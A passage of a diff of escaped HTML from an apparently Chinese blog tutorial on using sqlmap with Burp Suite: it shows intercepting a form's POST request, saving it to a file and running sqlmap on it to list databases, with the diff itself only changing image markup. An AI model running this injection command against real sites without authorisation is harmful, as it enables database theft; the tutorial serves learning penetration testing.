 &lt;h2 id=&#34;结合burpsuite使用&#34;&gt;结合burpsuite使用
 &lt;/h2&gt;&lt;p&gt;&lt;strong&gt;有的时候我们需要对一个表单进行注入，这时候就可以使用post注入&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&lt;mark&gt;-r：从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id=&#34;拦截请求&#34;&gt;拦截请求
-&lt;/h3&gt;&lt;p&gt;在设置代理后，表单随便填一个内容提交，查看post请求内容，复制另存为.txt&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627100838668.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627100838668&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;在设置代理后，表单随便填一个内容提交，查看post请求内容，复制另存为.txt
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627100838668.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627100838668.png&#34; alt=&#34;image-20250627100838668&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;h3 id=&#34;进行爆破&#34;&gt;进行爆破
 &lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r post.txt --dbs --batch
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101026867.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20250627101026867&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
+&lt;div class=&#34;post-img-view&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627101026867.png&#34;&gt;
+&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101026867.png&#34; alt=&#34;image-20250627101026867&#34;  /&gt;
+&lt;/a&gt;
+&lt;/div&gt;
+&lt;/p&gt;
 &lt;p&gt;同样可以得到正确结果&lt;/p&gt;
 &lt;p&gt;详细的sqlmap学习请参考这位师傅的文章，非常完整，无与伦比的好：&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.tr0y.wang/2018/03/21/sqlmap-guide/#sqlmap-%E7%9A%84%E5%90%84%E4%B8%AA%E9%98%B6%E6%AE%B5&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
